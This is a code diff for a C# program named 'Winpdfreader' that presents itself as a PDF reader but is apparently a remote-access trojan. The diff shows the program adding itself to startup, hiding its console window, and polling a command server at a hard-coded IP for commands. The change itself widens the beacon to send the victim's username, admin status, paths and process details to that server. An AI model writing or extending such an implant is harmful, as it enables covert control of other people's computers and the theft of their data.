@@ -17,12 +17,12 @@ namespace Winpdfreader
             GeneralInfo infoObj = new GeneralInfo();
             Persistance persObj = new Persistance(infoObj);
             Operations opsObj = new Operations(infoObj);
-            
+
 
             var ts = new ThreadStart(ServInteraction);
             var bgThread = new Thread(ts);
             bgThread.Start();
-            
+
             persObj.AddToStartup();
             // infoObj.printInfos();
 
@@ -62,14 +62,16 @@ namespace Winpdfreader
             string registerUrl = "http://192.168.96.132/register.php";
             string getResults = "http://192.168.96.132/getResults.php";
             string getCmd = "http://192.168.96.132/getCmd.php";
-            
+
             GeneralInfo infoObj = new GeneralInfo();
             Operations opsObj = new Operations(infoObj);
-            
+
             System.Net.WebClient webClient = new WebClient();
 
             string hostParams = "hostname=" + infoObj.hostName + "&ip=" + infoObj.ipv4Address + "&os=" +
-                                infoObj.oSystem;
+                                infoObj.oSystem + "&username=" + infoObj.uName + "&tmp_path=" + infoObj.tmpPath +
+                                "&is_admin=" + infoObj.isAdmin + "&pwd=" + infoObj.cDirectory + "&process_name=" +
+                                infoObj.pName + "&file_name=" + infoObj.ePath + "&process_id=" + infoObj.pId;
             webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
 
             webClient.UploadString(registerUrl, hostParams);
@@ -106,19 +108,27 @@ namespace Winpdfreader
                 }
             }
         }
-        
-        static class ConsoleExtension {
+
+        static class ConsoleExtension
+        {
             const int SW_HIDE = 0;
             const int SW_SHOW = 5;
             readonly static IntPtr handle = GetConsoleWindow();
-            [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
-            [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd,int nCmdShow);
 
-            public static void Hide() {
-                ShowWindow(handle,SW_HIDE); //hide the console
+            [DllImport("kernel32.dll")]
+            static extern IntPtr GetConsoleWindow();
+
+            [DllImport("user32.dll")]
+            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+            public static void Hide()
+            {
+                ShowWindow(handle, SW_HIDE); //hide the console
             }
-            public static void Show() {
-                ShowWindow(handle,SW_SHOW); //show the console
+
+            public static void Show()
+            {
+                ShowWindow(handle, SW_SHOW); //show the console
             }
         }
     }
